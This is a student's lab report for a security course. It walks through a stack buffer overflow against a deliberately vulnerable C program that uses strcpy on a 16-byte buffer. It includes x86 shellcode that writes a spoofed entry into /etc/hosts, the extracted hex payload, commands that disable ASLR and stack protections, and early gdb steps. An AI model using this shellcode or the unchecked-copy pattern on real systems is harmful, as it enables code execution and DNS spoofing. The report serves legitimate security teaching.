# Lab #1,22110034, Nguyen Gia Huy, INSE331280E_02FIE

# Task 1: Software buffer overflow attack

Given a vulnerable C program

```
#include <stdio.h>
#include <string.h>

int main(int argc, char* argv[])
{
    char buffer[16];
    strcpy(buffer,argv[1]);
    return 0;
}
```

and a shellcode in asm. This shellcode add a new entry in hosts file

```
global _start

section .text

_start:
    xor ecx, ecx
    mul ecx
    mov al, 0x5     
    push ecx
    push 0x7374736f     ;/etc///hosts
    push 0x682f2f2f
    push 0x6374652f
    mov ebx, esp
    mov cx, 0x401       ;permmisions
    int 0x80            ;syscall to open file

    xchg eax, ebx
    push 0x4
    pop eax
    jmp short _load_data    ;jmp-call-pop technique to load the map

_write:
    pop ecx
    push 20             ;length of the string, dont forget to modify if changes the map
    pop edx
    int 0x80            ;syscall to write in the file

    push 0x6
    pop eax
    int 0x80            ;syscall to close the file

    push 0x1
    pop eax
    int 0x80            ;syscall to exit

_load_data:
    call _write
    google db "127.1.1.1 google.com"
```

**Question 1**:

- Compile asm program and C program to executable code.
- Conduct the attack so that when C executable code runs, shellcode will be triggered and a new entry is added to the /etc/hosts file on your linux.  You are free to choose Code Injection or Environment Variable approach to do.
- Write step-by-step explanation and clearly comment on instructions and screenshots that you have made to successfully accomplished the attack.

**Anwser 1:**

## 1. Compile asm program and C program to executable code:

*Compile the C program with `gcc`:*

```bash
gcc vuln.c -o vuln.out -fno-stack-protector -z execstack -mpreferred-stack-boundary=2
```

*Assemble the shellcode:*

```bash
nasm -f elf32 sh.asm -o sh.o
```

*Link the object file to create an executable:*

```bash
ld -m elf_i386 -o sh sh.o
```

Generate the Hex String:

```
for i in $(objdump -d sh | grep "^ " | cut -f2); do echo -n '\x'$i; done; echo
```

Result:

```bash
\x31\xc9\xb0\x05\x51\x68\x6f\x73\x74\x73\x68\x2f\x2f\x2f\x68\x68\x2f\x65\x74\x63\x89\xe3\x66\xb9\x01\x04\xcd\x80\x93\x6a\x04\x58\xeb\x10\x59\x6a\x14\x5a\xcd\x80\x6a\x06\x58\xcd\x80\x6a\x01\x58\xcd\x80\xe8\xeb\xff\xff\xff\x31\x32\x37\x2e\x31\x2e\x31\x2e\x31\x20\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d
```

Estimate Buffer Size:

![image-20241022100650845](C:\Users\User\AppData\Roaming\Typora\typora-user-images\image-20241022100650845.png)

## 2. Prepare for the attack

Turn off OS's address space layout randomization:

```bash
sudo sysctl -w kernel.randomize_va_space=0
```

> The password for seed: dees

Result:

![image-20241022111228390](C:\Users\User\AppData\Roaming\Typora\typora-user-images\image-20241022111228390.png)

Creat link to zsh:

```bash
sudo ln -sf /bin/zsh /bin/sh
```

## 3. Conducting the attack

Load `vuln.out` in `gdb`:

```bash
gdb -q vuln.out
```

Disassemble `main` function:

```bash
gdb-peda$ disas main
```

Result:

![image-20241022110847287](C:\Users\User\AppData\Roaming\Typora\typora-user-images\image-20241022110847287.png)

From the above result, we see that the address after the `strcpy` instruction is `0x08048423`. So we put break point at this address.

```bash
b *0x08048423
```

![image-20241022112205737](C:\Users\User\AppData\Roaming\Typora\typora-user-images\image-20241022112205737.png)